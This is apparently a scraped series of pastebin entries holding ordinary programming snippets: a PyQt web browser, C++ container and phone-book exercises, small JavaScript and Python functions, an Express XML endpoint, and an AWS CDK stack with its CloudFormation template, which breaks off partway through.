        self.tabs.setDocumentMode(True)
        self.tabs.tabBarDoubleClicked.connect(self.tab_open_doubleclick)
        self.tabs.currentChanged.connect(self.current_tab_changed)
        self.tabs.setTabsClosable(True)
        self.tabs.tabCloseRequested.connect(self.close_current_tab)

        self.setCentralWidget(self.tabs)

        self.create_navbar()

        # Add at least one initial tab
        self.add_new_tab()

        self.setStyleSheet(""""""
            QMainWindow {
                background-color: #8B0000;
            }
            QTabWidget::pane {
                border: none;
            }
            QTabWidget::tab-bar {
                alignment: center;
            }
            QTabBar::tab {
                background: #660000;
                color: white;
                border: none;
                padding: 8px 20px;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
            }
            QTabBar::tab:selected {
                background: #B30000;
            }
            QTabBar::close-button {
                image: url(Icons/close.png);
                subcontrol-origin: padding;
                subcontrol-position: right;
                width: 16px;
                height: 16px;
            }
            QTabBar::close-button:hover {
                image: url(Icons/close-hover.png);
            }
            QToolBar {
                background-color: #660000;
                border: none;
            }
            QLineEdit {
                background-color: #660000;
                border: 1px solid #8B0000;
                padding: 5px;
                color: white;
                border-radius: 4px;
            }
            QPushButton {
                background-color: #B30000;
                color: white;
                border: none;
                padding: 10px;
                margin-left: 5px;
                margin-right: 5px;
                border-radius: 5px;
            }
            QPushButton:hover {
                background-color: #940000;
            }
        """""")

        self.show()

    def create_navbar(self):
        navbar = QToolBar()
        self.addToolBar(navbar)

        icon_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Icons')

        # Custom minimize button
        minimize_btn = QPushButton('‚Äî', self)
        minimize_btn.clicked.connect(self.showMinimized)
        self.set_button_style(minimize_btn, '#660000', 'white')
        navbar.addWidget(minimize_btn)

        # Custom close button
        close_btn = QPushButton('√ó', self)
        close_btn.clicked.connect(self.close)
        self.set_button_style(close_btn, '#660000', 'white')
        navbar.addWidget(close_btn)

        back_btn = QAction(QIcon(os.path.join(icon_path, ""back.png"")), 'Back', self)
        back_btn.triggered.connect(lambda: self.tabs.currentWidget().back())
        navbar.addAction(back_btn)

        forward_btn = QAction(QIcon(os.path.join(icon_path, ""forward.png"")), 'Forward', self)
        forward_btn.triggered.connect(lambda: self.tabs.currentWidget().forward())
        navbar.addAction(forward_btn)

        reload_btn = QAction(QIcon(os.path.join(icon_path, ""reload.png"")), 'Reload', self)
        reload_btn.triggered.connect(lambda: self.tabs.currentWidget().reload())
        navbar.addAction(reload_btn)

        home_btn = QAction(QIcon(os.path.join(icon_path, ""home.png"")), 'Home', self)
        home_btn.triggered.connect(self.navigate_home)
        navbar.addAction(home_btn)

        self.url_bar = QLineEdit()
        self.url_bar.returnPressed.connect(self.navigate_to_url)
        navbar.addWidget(self.url_bar)

        search_btn = QPushButton('Search', self)
        search_btn.clicked.connect(self.search)
        navbar.addWidget(search_btn)

        # New Tab action with custom icon
        new_tab_action = QAction(QIcon(os.path.join(icon_path, ""plus.png"")), 'New Tab', self)
        new_tab_action.triggered.connect(lambda: self.add_new_tab())
        navbar.addAction(new_tab_action)

    def set_button_style(self, button, bg_color, text_color):
        button.setStyleSheet(f""background-color: {bg_color}; color: {text_color}; border-radius: 10px; padding: 5px;"")

    def add_new_tab(self, qurl=None, label=""New Tab""):
        if qurl is None or isinstance(qurl, bool):
            qurl = QUrl('https://search.brave.com/')

        browser = QWebEngineView()

        # Enable dark mode preference for websites using JavaScript injection
        browser.page().runJavaScript('''
            const meta = document.createElement('meta');
            meta.name = 'theme-color';
            meta.content = '#000000';
            document.head.appendChild(meta);
            const style = document.createElement('style');
            style.textContent = `
                body {
                    background-color: #1E1E1E !important;
                    color: #FFFFFF !important;
                }
            `;
            document.head.appendChild(style);
        ''')

        i = self.tabs.addTab(browser, label)
        self.tabs.setCurrentIndex(i)

        browser.urlChanged.connect(lambda qurl, browser=browser: self.update_urlbar(qurl, browser))
        browser.loadFinished.connect(lambda _, i=i, browser=browser: self.tabs.setTabText(i, browser.page().title()))

        # Show close button on each tab
        self.tabs.tabBar().setTabButton(i, QTabBar.RightSide, self.create_tab_close_button(i))

        browser.setUrl(qurl)

    def create_tab_close_button(self, index):
        close_btn = QPushButton('√ó', self)
        close_btn.clicked.connect(lambda: self.close_tab(index))
        self.set_button_style(close_btn, '#660000', 'white')
        return close_btn

    def close_tab(self, index):
        self.tabs.removeTab(index)

    def tab_open_doubleclick(self, i):
        if i == -1:
            self.add_new_tab()

    def current_tab_changed(self, i):
        qurl = self.tabs.currentWidget().url()
        self.update_urlbar(qurl, self.tabs.currentWidget())
        self.update_title(self.tabs.currentWidget())

    def close_current_tab(self, i):
        if self.tabs.count() < 2:
            return

        self.tabs.removeTab(i)

    def update_title(self, browser):
        if browser != self.tabs.currentWidget():
            return

        title = self.tabs.currentWidget().page().title()
        self.setWindowTitle(f""{title} - Bloody Browser"")

    def navigate_home(self):
        self.tabs.currentWidget().setUrl(QUrl('https://search.brave.com/'))

    def navigate_to_url(self):
        url = self.url_bar.text()
        if not url.startswith(""http""):
            url = ""http://"" + url
        self.tabs.currentWidget().setUrl(QUrl(url))

    def search(self):
        query = self.url_bar.text()
        self.tabs.currentWidget().setUrl(QUrl(f""{query}""))

    def update_urlbar(self, qurl, browser=None):
        if browser != self.tabs.currentWidget():
            return

        self.url_bar.setText(qurl.toString())
        self.url_bar.setCursorPosition(0)

    def closeEvent(self, event):
        reply = QMessageBox.question(self, 'Bloody Browser', ""Are you sure to quit?"", QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            event.accept()
        else:
            event.ignore()

app = QApplication(sys.argv)
app.setWindowIcon(QIcon('Icons/browser.png'))
window = Browser()
sys.exit(app.exec_())
"
48VUrB38,Untitled,dllbridge,C,Saturday 29th of June 2024 02:37:23 AM CDT,"............................

.org  10h

     ld   A, 4
     ld   B, 2
     add  A, B

     inc  A
     dec  A

...........................

#include  <stdio.h>

 

/////////////////////////////////
int main()                     //
{
     
    int n1 = 2;
    int n2 = 4;  

    n1 = n1 + n2;
    
    n1 ++;
    n1 --;    
    printf(""n2 = %d\n"", n1);  
}


"
wsE1aTJK,Untitled,heon1423451,JSON,Saturday 29th of June 2024 02:37:16 AM CDT,"{""information"":""NONE""}"
RiyWu00Q,Untitled,35657,C++,Saturday 29th of June 2024 02:35:55 AM CDT,"#include <iostream>

using namespace std;

template <typename T>
class SimpleVector {

public:

	SimpleVector() : arr_(new T[10]), size_(10) {}

	SimpleVector(int size) : arr_(new T[size]), size_(size) {}

	SimpleVector(const SimpleVector& object) : arr_(new T[object.size_] {}), size_(object.size_) {
		for (int i = 0; i < size_; i++) {
			arr_[i] = object.arr_[i];
		};
	}

	SimpleVector& operator=(const SimpleVector& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = new T[object.size_];
			size_ = object.size_;
			for (int i = 0; i < size_; i++) {
				arr_[i] = object.arr_[i];
			}
		}
		return *this;
	}

	SimpleVector(SimpleVector&& object) : arr_(object.arr_), size_(object.size_) {
		object.arr_ = nullptr;
		object.size_ = 0;
	}

	SimpleVector& operator=(SimpleVector&& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = object.arr_;
			size_ = object.size_;
			object.arr_ = nullptr;
			object.size_ = 0;
		}
		return *this;
	}

	T& operator[] (int index) {
		if (index >= 0 && index < size_) {
			return arr_[index];
		}
	}

	T operator[] (int index) const {
		if (index >= 0 && index < size_) {
			return arr_[index];
		}
	}

	int Size() const {
		return size_;
	}

	~SimpleVector() {
		delete[] arr_;
	}

private:
	T* arr_;
	int size_;
};

template <typename T>
void sort(SimpleVector<T>& array) {
	for (int k = 0; k < array.Size(); k++) {
		for (int j = 0; j < array.Size() - 1; j++) {
			if (array[j] > array[j + 1]) {
				T temp = array[j];
				array[j] = array[j + 1];
				array[j + 1] = temp;
			}
		}
	}
}



template<typename T>
void print(const SimpleVector<T>& array) {
	for (int i = 0; i < array.Size(); i++) {
		cout << array[i] << "" "";
	}
	cout << endl;
}

int main() {
	SimpleVector<int> vec;
	for (int i = 0; i < vec.Size(); i++) {
		vec[i] = rand() % 10;
	}
	for (int i = 0; i < vec.Size(); i++) {
		cout << vec[i] << "" "";
	}
	cout << endl;

	SimpleVector<int> int_vector;
	for (int i = 0; i < int_vector.Size(); i++) {
		int_vector[i] = rand() % 10;
	}
	cout << ""int_vector:"" << endl;
	print(int_vector);
	cout << endl;
	cout << ""Sorted int_vector:"" << endl;
	sort(int_vector);
	print(int_vector);
	cout << endl;

	SimpleVector<string> string_vector;
	string_vector[0] = ""two"";
	string_vector[1] = ""seven"";
	string_vector[2] = ""zero"";
	string_vector[3] = ""four"";
	string_vector[4] = ""one"";
	string_vector[5] = ""three"";
	string_vector[6] = ""five"";
	string_vector[7] = ""six"";
	string_vector[8] = ""eight"";
	string_vector[9] = ""nine"";
	cout << ""string_vector:"" << endl;
	print(string_vector);
	cout << endl;
	cout << ""Sorted string_vector:"" << endl;
	sort(string_vector);
	print(string_vector);
	cout << endl;
}"
dRbFSddn,Untitled,35657,C++,Saturday 29th of June 2024 02:07:13 AM CDT,"#include <iostream>

using namespace std;


template<typename T>
class Array {

public:

    int get_size() const {
        return size;
    }

    T get_item(size_t index) const {
        if (index >= 0 && index < size) {
            return arr[index];
        }
    }

    void set_item(size_t index, T value) {
        if (index >= 0 && index < size) {
            arr[index] = value;
        }
    }

    void print() {
        for (int i = 0; i < size; i++) {
            cout << arr[i] << "" "";
        }
        cout << endl;
    }

    void sort() {
        for (int k = 0; k < size; k++) {
            for (int j = 0; j < size - 1; j++) {
                if (arr[j] > arr[j + 1]) {
                    T temp = arr[j];
                    arr[j] = arr[j + 1];
                    arr[j + 1] = temp;
                }
            }
        }
    }

private:
    static const size_t size = 5;
    T arr[size]{}; // –±–µ–∑ —Ñ–∏–≥—É—Ä–Ω—ã—Ö —Å–∫–æ–±–æ–∫ –º–∞—Å—Å–∏–≤ –Ω–µ –±—É–¥–µ—Ç –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω –∑–Ω–∞—á–µ–Ω–∏—è–º–∏ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
};

int main() {

    cout << ""Class Tempate Array"" << endl << endl;

    Array<int> int_array;
    cout << ""int Array initialization:"" << endl;
    int_array.print();
    int size = int_array.get_size();
    for (int i = 0; i < size; i++) {
        int_array.set_item(i, rand() % 10);
    }
    cout << endl << ""int Array after assignment:"" << endl;
    int_array.print();
    int_array.sort();
    cout << endl << ""int Array after ordering:"" << endl;
    int_array.print();
    cout << endl;

    Array<string> str_array;
    cout << ""str Array initialization:"" << endl;
    str_array.print();
    str_array.set_item(0, ""two"");
    str_array.set_item(1, ""seven"");
    str_array.set_item(2, ""zero"");
    str_array.set_item(3, ""four"");
    str_array.set_item(4, ""one"");
    cout << endl << ""str Array after assignment:"" << endl;
    str_array.print();
    str_array.sort();
    cout << endl << ""str Array after ordering:"" << endl;
    str_array.print();
}
"
bQg7Lqj4,test1,anantoss,JavaScript,Saturday 29th of June 2024 02:07:06 AM CDT,"//Function on making car rental recommendation
function recommendedCar(familySize, plannedDistanceToDrive) {
    if(familySize > 4) {
        console.log('Minivan')
    } else if(plannedDistanceToDrive<200) {
        console.log('Tesla')
    } else console.log('Toyota Camry') 
}
recommendedCar(2,100)
recommendedCar(5,100)
recommendedCar(2,200)"
GVQ8ALZV,Untitled,35657,C++,Saturday 29th of June 2024 02:04:50 AM CDT,"
#include <iostream>

using namespace std;

class SimpleVector {

public:

	SimpleVector() : arr_(new int[10]), size_(10) {}

	SimpleVector(int size) : arr_(new int[size]), size_(size) {}

	SimpleVector(const SimpleVector& object) : arr_(new int[object.size_]{}), size_(object.size_) {
		for (int i = 0; i < size_; i++) {
			arr_[i] = object.arr_[i];
		};
	}

	SimpleVector& operator=(const SimpleVector& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = new int[object.size_];
			size_ = object.size_;
			for (int i = 0; i < size_; i++) {
				arr_[i] = object.arr_[i];
			}
		}
		return *this;
	}

	SimpleVector(SimpleVector&& object) : arr_(object.arr_), size_(object.size_) {
		object.arr_ = nullptr;
		object.size_ = 0;
	}

	SimpleVector& operator=(SimpleVector&& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = object.arr_;
			size_ = object.size_;
			object.arr_ = nullptr;
			object.size_ = 0;
		}
		return *this;
	}

	int& operator[] (int index) {
		if (index >= 0 && index < size_) {
			return arr_[index];
		}
	}

	int operator[] (int index) const {
		if (index >= 0 && index < size_) {
			return arr_[index];
		}
	}

	int Size() const {
		return size_;
	}

	~SimpleVector() {
		delete[] arr_;
	}

private:
	int* arr_;
	int size_;
};



int main() {
	SimpleVector vec;
	for (int i = 0; i < vec.Size(); i++) {
		vec[i] =  rand() % 10;
	}
	for (int i = 0; i < vec.Size(); i++) {
		cout << vec[i] << "" "";
	}
	cout << endl;

	/*SimpleVector<int> int_vector;
	for (int i = 0; i < int_vector.Size(); i++) {
		int_vector[i] = rand() % 10;
	}
	cout << ""int_vector:"" << endl;
	print(int_vector);
	cout << endl;
	cout << ""Sorted int_vector:"" << endl;
	sort(int_vector);
	print(int_vector);
	cout << endl;

	SimpleVector<string> string_vector;
	string_vector[0] = ""two"";
	string_vector[1] = ""seven"";
	string_vector[2] = ""zero"";
	string_vector[3] = ""four"";
	string_vector[4] = ""one"";
	string_vector[5] = ""three"";
	string_vector[6] = ""five"";
	string_vector[7] = ""six"";
	string_vector[8] = ""eight"";
	string_vector[9] = ""nine"";
	cout << ""string_vector:"" << endl;
	print(string_vector);
	cout << endl;
	cout << ""Sorted string_vector:"" << endl;
	sort(string_vector);
	print(string_vector);
	cout << endl;*/
}"
mdg86icA,server.ts,dobeerman,TypeScript,Saturday 29th of June 2024 01:45:21 AM CDT,"import express from ""express"";
import bodyParser from 'body-parser';
import { XMLParser } from ""fast-xml-parser"";
var urlencodedParser = bodyParser.urlencoded({ extended: true });
const parser = new XMLParser({
  attributeNamePrefix: ""@"",
  ignoreAttributes: false,
  ignoreDeclaration: true
});

const app = express();
app.use(bodyParser.text({ type: 'application/xml' }));

app.listen(3000, () => {
  console.log(""Server running on port 3000"");
});

app.put(""*"", urlencodedParser, (req, res, next) => {
  const body = req.body.replace(/^\""/, """").replace(/\""$/, """").replace(/\\\""/g, '""');
  console.log(parser.parse(body));
  res.json();
});
"
P5znSQJs,Untitled,35657,C++,Saturday 29th of June 2024 01:43:36 AM CDT,"
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>

using namespace std;

struct contact {
	char name[40];
	char mobile_phone[20];
	char home_phone[20];
	char work_phone[20];
};

class phone_book {

public:

	phone_book() : contacts_number(0), max_contacts_number(4), store(new contact[4]) {}

	explicit phone_book(int max_number) : contacts_number(0), max_contacts_number(max_number), store(new contact[max_number]) {}

	phone_book(const phone_book& other) : contacts_number(0), max_contacts_number(other.max_contacts_number), store(new contact[other.max_contacts_number]) {
		for (int i = 0; i < other.contacts_number; i++) {
			add_contact(other.store[i].name, other.store[i].mobile_phone, other.store[i].home_phone, other.store[i].work_phone);
		}
	}

	phone_book& operator=(const phone_book& other) {
		if (this != &other) {
			delete[] store;
			contacts_number = 0;
			max_contacts_number = other.max_contacts_number;
			store = new contact[max_contacts_number];
			for (int i = 0; i < other.contacts_number; i++) {
				add_contact(other.store[i].name, other.store[i].mobile_phone, other.store[i].home_phone, other.store[i].work_phone);
			}
		}
		return *this;
	}

	phone_book(phone_book&& other) : contacts_number(other.contacts_number), max_contacts_number(other.max_contacts_number), store(other.store) {
		other.store = nullptr;
	}

	phone_book& operator=(phone_book&& other) {
		if (this != &other) {
			delete[] store;
			contacts_number = other.contacts_number;
			max_contacts_number = other.max_contacts_number;
			store = other.store;
			other.store = nullptr;
		}
		return *this;
	}

	void add_contact(const char* name, const char* mobile_phone, const char* home_phone, const char* work_phone) {
		if (contacts_number == max_contacts_number) {
			contact* temp = new contact[max_contacts_number * 2];
			for (int i = 0; i < contacts_number; i++) {
				temp[i] = store[i];
			}
			delete[] store;
			store = temp;
			max_contacts_number *= 2;
		}
		strcpy(store[contacts_number].name, name);
		strcpy(store[contacts_number].mobile_phone, mobile_phone);
		strcpy(store[contacts_number].home_phone, home_phone);
		strcpy(store[contacts_number].work_phone, work_phone);
		contacts_number++;
	}


	void del_contact(const char* name) {
		for (int i = 0; i < contacts_number; i++) {
			if (!strcmp(store[i].name, name)) {
				for (int j = i; j < contacts_number - 1; j++) {
					store[j] = store[j + 1];
				}
				contacts_number--;
				i--; // –Ω–∞ —Å–ª—É—á–∞–π, –µ—Å–ª–∏ –ø–æ–¥—Ä—è–¥ –∏–¥—É—Ç –¥–≤–∞ –æ–¥–Ω–æ–∏–º–µ–Ω–Ω—ã—Ö –∫–æ–Ω—Ç–∞–∫—Ç–∞ (–∏–Ω–∞—á–µ —á–µ—Ä–µ–∑ –≤—Ç–æ—Ä–æ–π –ø–µ—Ä–µ—Å–∫–∞–∫–∏–≤–∞–µ—Ç)
			}
		}
	}

	void show_all_contacts() const {
		for (int i = 0; i < contacts_number; i++) {
			cout << store[i].name << "", –º–æ–±–∏–ª—å–Ω—ã–π —Ç–µ–ª–µ—Ñ–æ–Ω -  "" << store[i].mobile_phone << "", –¥–æ–º–∞—à–Ω–∏–π —Ç–µ–ª–µ—Ñ–æ–Ω - "" << store[i].home_phone << "", —Ä–∞–±–æ—á–∏–π —Ç–µ–ª–µ—Ñ–æ–Ω - "" << store[i].work_phone << endl;
		}
		cout << endl;
	}

	void find_contact_name(const char* name) const {
		for (int i = 0; i < contacts_number; i++) {
			if (!strcmp(store[i].name, name)) {
				cout << store[i].name << "", –º–æ–±–∏–ª—å–Ω—ã–π —Ç–µ–ª–µ—Ñ–æ–Ω -  "" << store[i].mobile_phone << "", –¥–æ–º–∞—à–Ω–∏–π —Ç–µ–ª–µ—Ñ–æ–Ω - "" << store[i].home_phone << "", —Ä–∞–±–æ—á–∏–π —Ç–µ–ª–µ—Ñ–æ–Ω - "" << store[i].work_phone << endl;
			}
		}
	}

	bool operator==(const phone_book& other) const {
		if (this->contacts_number != other.contacts_number) {
			return false;
		}
		for (int i = 0; i < contacts_number; i++) {
			if (strcmp(other.store[i].name, store[i].name) || strcmp(other.store[i].mobile_phone, store[i].mobile_phone) || strcmp(other.store[i].home_phone, store[i].home_phone) || strcmp(other.store[i].work_phone, store[i].work_phone)) {
				return false;
			}
		}
		return true;
	}

	bool operator!=(const phone_book& other) const {
		return !(*this == other);
	}

	~phone_book() {
		delete[] store;
	}

private:
	int contacts_number;
	int max_contacts_number;
	contact* store;
};


int main() {

	setlocale(LC_ALL, ""ru"");

	phone_book my_book;

	my_book.add_contact(""–ò–≤–∞–Ω"", ""+79111111111"", ""111111"", ""121212"");
	my_book.add_contact(""–û–ª—è"", ""+79111114444"", ""114444"", ""141414"");
	my_book.add_contact(""–°–∞—à–∞"", ""+79111115555"", ""115555"", ""151515"");
	my_book.add_contact(""–ñ–µ–Ω—è"", ""+79111116666"", ""116666"", ""161616"");

	my_book.show_all_contacts();

	my_book.del_contact(""–ñ–µ–Ω—è"");

	my_book.show_all_contacts();

	my_book.find_contact_name(""–°–∞—à–∞"");

	cout << endl;

	const phone_book my_book2(my_book);

	my_book2.show_all_contacts();

	phone_book my_book3;

	my_book3 = my_book;

	my_book3.show_all_contacts();

	cout << (my_book == my_book2) << endl;

	cout << (my_book != my_book2) << endl;

}
"
aPbT2pda,Algoverse_adesh_31,kucheasysa,Python,Saturday 29th of June 2024 01:40:57 AM CDT,"#User function Template for python3

'''

#Linked list class
class LinkedList:
    def __init__(self):
        self.head=None
        self.tail=None
        '''



class Solution:
    
    #Function to count nodes of a linked list.
    def getCount(self, head_node):
        count=0
        curr=head_node
        while curr!=None:
            count+=1
            curr=curr.next
        return count
        #code here
"
U0v6b0Yu,lib/sts-api-destinations-stack.ts,dobeerman,TypeScript,Saturday 29th of June 2024 01:31:39 AM CDT,"import * as cdk from ""aws-cdk-lib"";
import * as events from ""aws-cdk-lib/aws-events"";
import * as destinations from ""aws-cdk-lib/aws-events-targets"";
import { Construct } from ""constructs"";
import path from ""path"";

export class StsApiDestinationsStack extends cdk.Stack {
  constructor(scope: Construct, id: string, props?: cdk.StackProps) {
    super(scope, id, props);

    const eventBus = new events.EventBus(this, ""EventBus"", { eventBusName: ""api-event-bus"" });

    const connectionId = ""datalake-destination"";
    const connection = new events.Connection(this, connectionId, {
      authorization: events.Authorization.apiKey(""x-api-key"", cdk.SecretValue.unsafePlainText(""notused"")),
      connectionName: connectionId,
    });

    const baseUrl = ""https://your.url"";

    const datahubDestinations = [
      {
        name: ""order"",
        pathParameterValues: [
          events.EventField.fromPath(""$.detail.teamId""),
          events.EventField.fromPath(""$.detail.userId""),
          events.EventField.fromPath(""$.detail.orderId""),
        ],
        detailType: [""detail1"", ""detail2"", ""detail3""],
      },
      {
        name: ""request"",
        pathParameterValues: [events.EventField.fromPath(""$.detail.requestId"")],
        detailType: [""request""],
      },
    ];

    datahubDestinations.forEach(destination => {
      const url = new URL(baseUrl);
      url.pathname = path.join(url.pathname, ...new Array(destination.pathParameterValues.length).fill(""*""));

      // Define the destination
      const apiDestination = new events.ApiDestination(this, `destination-${destination.name}`, {
        connection,
        endpoint: url.toString(),
        httpMethod: events.HttpMethod.PUT,
      });

      // Create a rule for EventBridge
      const rule = new events.Rule(this, `Rule-${destination.name}`, {
        eventBus,
        eventPattern: {
          source: [""com.app.company""],
          detailType: destination.detailType,
        },
        description: `Rule for ${destination.name}`,
      });

      // Add targets to the rule
      rule.addTarget(
        new destinations.ApiDestination(apiDestination, {
          pathParameterValues: destination.pathParameterValues,
          retryAttempts: 3,
          event: events.RuleTargetInput.fromEventPath(""$.detail.xml""),
          headerParameters: {
            ""content-type"": ""application/xml"",
            accept: ""application/xml"",
          },
        }),
      );
    });
  }
}
"
ZqvCEDbt,StsApiDestinationsStack.template.json,dobeerman,JSON,Saturday 29th of June 2024 01:28:54 AM CDT,"{
 ""Resources"": {
  ""EventBus7B8748AA"": {
   ""Type"": ""AWS::Events::EventBus"",
   ""Properties"": {
    ""Name"": ""api-event-bus""
   },
   ""Metadata"": {
    ""aws:cdk:path"": ""StsApiDestinationsStack/EventBus/Resource""
   }
  },
  ""datalakedestinationConnectionA812A378"": {
   ""Type"": ""AWS::Events::Connection"",
   ""Properties"": {
    ""AuthParameters"": {
     ""ApiKeyAuthParameters"": {
      ""ApiKeyName"": ""x-api-key"",
      ""ApiKeyValue"": ""notused""
     }
    },
    ""AuthorizationType"": ""API_KEY"",
    ""Name"": ""datalake-destination""
   },
   ""Metadata"": {
    ""aws:cdk:path"": ""StsApiDestinationsStack/datalake-destination/Connection""
   }
  },
  ""destinationorderApiDestination980EB4EF"": {
   ""Type"": ""AWS::Events::ApiDestination"",
   ""Properties"": {
    ""ConnectionArn"": {
     ""Fn::GetAtt"": [
      ""datalakedestinationConnectionA812A378"",
      ""Arn""
     ]
    },
    ""HttpMethod"": ""PUT"",
    ""InvocationEndpoint"": ""https://your.url/*/*/*""
   },
   ""Metadata"": {
    ""aws:cdk:path"": ""StsApiDestinationsStack/destination-order/ApiDestination""
   }
  },
  ""destinationorderEventsRole2429DAAF"": {
   ""Type"": ""AWS::IAM::Role"",
   ""Properties"": {
    ""AssumeRolePolicyDocument"": {
     ""Statement"": [
      {
       ""Action"": ""sts:AssumeRole"",
       ""Effect"": ""Allow"",
       ""Principal"": {
        ""Service"": ""events.amazonaws.com""
       }
      }
     ],
     ""Version"": ""2012-10-17""
    }
   },
   ""Metadata"": {
    ""aws:cdk:path"": ""StsApiDestinationsStack/destination-order/EventsRole/Resource""
   }
  },
  ""destinationorderEventsRoleDefaultPolicyFE67DF4F"": {
   ""Type"": ""AWS::IAM::Policy"",
   ""Properties"": {
    ""PolicyDocument"": {
     ""Statement"": [
      {
       ""Action"": ""events:InvokeApiDestination"",
       ""Effect"": ""Allow"",
       ""Resource"": {
        ""Fn::GetAtt"": [
         ""destinationorderApiDestination980EB4EF"",
         ""Arn""
        ]
       }
      }
     ],
     ""Version"": ""2012-10-17""
    },
    ""PolicyName"": ""destinationorderEventsRoleDefaultPolicyFE67DF4F"",
    ""Roles"": [
     {
      ""Ref"": ""destinationorderEventsRole2429DAAF""
     }
    ]
   },
   ""Metadata"": {
    ""aws:cdk:path"": ""StsApiDestinationsStack/destination-order/EventsRole/DefaultPolicy/Resource""
   }
  },
  ""Ruleorder602FD152"": {
   ""Type"": ""AWS::Events::Rule"",
   ""Properties"": {
    ""Description"": ""Rule for order"",
    ""EventBusName"": {
     ""Ref"": ""EventBus7B8748AA""
    },
    ""EventPattern"": {
     ""source"": [
      ""com.app.company""
     ],
     ""detail-type"": [
      ""detail1"",
      ""detail2"",
      ""detail3""
     ]
    },
    ""State"": ""ENABLED"",
    ""Targets"": [
     {
      ""Arn"": {
       ""Fn::GetAtt"": [
        ""destinationorderApiDestination980EB4EF"",
        ""Arn""
       ]
      },
      ""HttpParameters"": {
       ""HeaderParameters"": {
        ""content-type"": ""application/xml"",
        ""accept"": ""application/xml""
       },
       ""PathParameterValues"": [
        ""$.detail.teamId"",
        ""$.detail.userId"",
        ""$.detail.orderId""
       ]
      },
      ""Id"": ""Target0"",
      ""InputPath"": ""$.detail.xml"",
      ""RetryPolicy"": {
       ""MaximumRetryAttempts"": 3
      },
      ""RoleArn"": {
       ""Fn::GetAtt"": [
        ""destinationorderEventsRole2429DAAF"",
        ""Arn""
       ]
      }
     }
    ]
   },
   ""Metadata"": {
    ""aws:cdk:path"": ""StsApiDestinationsStack/Rule-order/Resource""
   }
  },
  ""destinationrequestApiDestinationAA8C1202"": {
   ""Type"": ""AWS::Events::ApiDestination"",
   ""Properties"": {
    ""ConnectionArn"": {
     ""Fn::GetAtt"": [
      ""datalakedestinationConnectionA812A378"",
      ""Arn""
     ]
    },
    ""HttpMethod"": ""PUT"",
    ""InvocationEndpoint"": ""https://your.url/*""
   },
   ""Metadata"": {
    ""aws:cdk:path"": ""StsApiDestinationsStack/destination-request/ApiDestination""
   }
  },
  ""destinationrequestEventsRole85C604E8"": {
   ""Type"": ""AWS::IAM::Role"",
   ""Properties"": {
    ""AssumeRolePolicyDocument"": {
     ""Statement"": [
      {
       ""Action"": ""sts:AssumeRole"",
       ""Effect"": ""Allow"",
       ""Principal"": {
        ""Service"": ""events.amazonaws.com""
       }
      }
     ],
     ""Version"": ""2012-10-17""
    }
   },
   ""Metadata"": {
    ""aws:cdk:path"": ""StsApiDestinationsStack/destination-request/EventsRole/Resource""
   }
  },
  ""destinationrequestEventsRoleDefaultPolicy0E02410E"": {
   ""Type"": ""AWS::IAM::Policy"",
   ""Properties"": {
    ""PolicyDocument"": {
     ""Statement"": [
      {
       ""Action"": ""events:InvokeApiDestination"",
       ""Effect"": ""Allow"",
       ""Resource"": {
        ""Fn::GetAtt"": [
         ""destinationrequestApiDestinationAA8C1202"",
         ""Arn""
        ]
       }
      }
     ],
     ""Version"": ""2012-10-17""
    },
    ""PolicyName"": ""destinationrequestEventsRoleDefaultPolicy0E02410E"",
    ""Roles"": [
     {
      ""Ref"": ""destinationrequestEventsRole85C604E8""
     }
    ]
   },
   ""Metadata"": {
    ""aws:cdk:path"": ""StsApiDestinationsStack/destination-request/EventsRole/DefaultPolicy/Resource""
   }
  },
  ""Rulerequest2922CEE3"": {
   ""Type"": ""AWS::Events::Rule"",
   ""Properties"": {
    ""Description"": ""Rule for request"",
    ""EventBusName"": {
     ""Ref"": ""EventBus7B8748AA""
    },
    ""EventPattern"": {
     ""source"": [
      ""com.app.company""
     ],
     ""detail-type"": [
      ""request""
     ]
    },
    ""State"": ""ENABLED"",
    ""Targets"": [
     {
      ""Arn"": {
       ""Fn::GetAtt"": [
        ""destinationrequestApiDestinationAA8C1202"",
        ""Arn""
       ]
      },
      ""HttpParameters"": {
       ""HeaderParameters"": {
        ""content-type"": ""application/xml"",
        ""accept"": ""application/xml""
       },
       ""PathParameterValues"": [
        ""$.detail.requestId""
       ]
      },
      ""Id"": ""Target0"",
      ""InputPath"": ""$.detail.xml"",
      ""RetryPolicy"": {
       ""MaximumRetryAttempts"": 3
      },
      ""RoleArn"": {
       ""Fn::GetAtt"": [
        ""destinationrequestEventsRole85C604E8"",
        ""Arn""
       ]
      }
     }
    ]
   },
   ""Metadata"": {
    ""aws:cdk:path"": ""StsApiDestinationsStack/Rule-request/Resource""
   }
  },
  ""CDKMetadata"": {
   ""Type"": ""AWS::CDK::Metadata"",
   ""Properties"": {
    ""Analytics"": ""v2:deflate64:H4sIAAAAAAAA/12MywrCMBBFv8V9OrZFcK3VvcQPkJiOMH1MpJO0SMm/S6hicXXuPXeYEordHsqNmSSzdZt1dIf56o1tlZnkNuOI7AXmc+IxiKoe/MuOGa0nx0mv2uFJJxRPbL7jn9Ghw6QToyLTw6zdRyVeXEf2leqSYlQaxYXBLjerXDmuKT2Nil2N0Mh2LHMocsg3jRBlQ2BPPYJe+AZ9nnqP8gAAAA==""
   },
   ""Metadata"": {
    ""aws:cdk:path"": ""StsApiDestinationsStack/CDKMetadata/Default""
   },
   ""Condition"": ""CDKMetadataAvailable""
  }
 },
 ""Conditions"": {
  ""CDKMetadataAvailable"": {
   ""Fn::Or"": [
    {
     ""Fn::Or"": [
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""af-south-1""
       ]
      },
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""ap-east-1""
       ]
      },
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""ap-northeast-1""
       ]
      },
      {
       ""Fn::Equals"": [
        {
         ""Ref"": ""AWS::Region""
        },
        ""ap-northeast-2""
       ]
      },
      {
       ""Fn::Equals"": [
